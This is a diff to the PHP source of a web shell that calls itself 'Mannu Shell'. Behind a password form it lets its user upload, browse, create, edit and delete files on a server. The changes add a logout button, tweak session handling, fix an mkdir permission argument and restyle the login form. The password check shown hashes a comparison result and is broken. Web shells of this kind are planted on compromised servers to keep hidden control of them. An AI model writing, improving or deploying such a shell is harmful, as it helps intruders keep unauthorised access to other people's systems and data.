@@ -144,7 +144,11 @@ if(isset($_POST['khulja']) && md5($_POST['lock']==$simsim))
 {
 $_SESSION['permitted']='321';	
 }
-
+if(isset($_POST['out']))
+{
+	unset($_SESSION['permitted']);
+	echo "<br>Session has been terminated, Thank you for using Mannu Shell _/\_ <br>";
+}
 
 if(@$_SESSION['permitted']=='321')
 {
@@ -222,7 +226,7 @@ if (move_uploaded_file($_FILES['drag']['tmp_name'], $_FILES['drag']['name']))
 			{
 				if (@opendir(trim($_POST['di']))) 
 				{
-			unset($_SESSION['d']);
+			
 			$_SESSION['d'] = trim($_POST['di']);
 				}
 				else 
@@ -261,7 +265,7 @@ if (move_uploaded_file($_FILES['drag']['tmp_name'], $_FILES['drag']['name']))
 			$new =str_replace("//","/",$new);
 			if(@opendir($new))
 			{
-			unset($_SESSION['d']);
+			
 			$_SESSION['d']=$new;
 			}
 			
@@ -302,7 +306,7 @@ file lo : <input type=file name=drag>
 error_reporting(0);	
 if(isset($_POST['dcreate']))
 {
-$result=mkdir(trim($_POST['dname']),'0755');	
+$result=mkdir(trim($_POST['dname']),0755);	
 	
 }
 if(isset($_POST['fcreate']))
@@ -368,13 +372,16 @@ echo "<hr>";
 			echo "<table width=100% style=\"margin: 0px 0px 1px 0px;border:none;background:#191919;\"><tr><td><form method=post  style=\"margin: 0px 0px 0px 0px;font-size:14px;\"><input type=hidden name=act value=\"".$infile."\">".$infile." </td><td align=right>".substr(sprintf('%o', fileperms($final)), -4)."</td><td align=right width=20%><input type=submit name=edf value=\"eDiT\"> &nbsp <input type=submit name=def value=\"uda de xD\"></form></td></tr></table>";
 			}
 			}		
+			echo '<style type="text/css">#cot_tl_fixed{background-color:white;position:fixed;top:0px;font-Asize:50px;right:0px;clip:_top:expression(document.documentElement.scrollTop+document.documentElement.clientHeight-this.clientHeight);_left:expression(document.documentElement.scrollLeft + document.documentElement.clientWidth - offsetWidth);}</style>
+<span style="color: black;">
+<div id="cot_tl_fixed"><form method=post style="margin:0px 0px 0px 0px;"><input type=submit style="background-color:red;" name=out value="session end"></form></div></span>';
 }
 
 else
 {
 	
 	
-	echo '<table  style="margin:10% 30% 0% 30%;"><tr><td><form method=post style="margin:5% 5% 5% 5%;" > Pass Please-><input type=password name=lock> &nbsp  <input type=submit name=khulja value="khul ja sim sim"></form></table>';
+	echo '<table width=40% style="margin:10% 30% 0% 30%;"><tr><td align=center><form method=post style="margin:5% 5% 5% 5%;" > Pass Please-><input type=password name=lock> &nbsp  <input type=submit name=khulja value="khul ja sim sim"></form></table>';
 }		
-			
+		
 ?>
